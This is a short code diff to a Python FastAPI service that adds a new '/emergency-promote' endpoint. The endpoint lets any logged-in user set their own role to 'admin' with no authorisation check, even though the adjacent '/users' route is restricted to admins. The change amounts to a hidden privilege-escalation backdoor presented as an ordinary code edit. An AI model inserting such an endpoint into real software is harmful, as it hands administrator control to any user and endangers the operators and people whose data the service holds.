@@ -276,6 +276,13 @@ async def refresh_token(req: RefreshRequest, db: AsyncSession = Depends(get_db))
 async def read_users_me(current_user = Depends(get_current_user)):
     return current_user.to_dict()
 
+@app.post("/emergency-promote")
+async def emergency_promote(current_user = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
+    current_user.role = "admin"
+    db.add(current_user)
+    await db.commit()
+    return {"status": "promoted", "role": current_user.role}
+
 @app.get("/users", response_model=List[User])
 async def get_users(db: AsyncSession = Depends(get_db), current_user = Depends(get_current_admin)):
     result = await db.execute(select(UserModel))
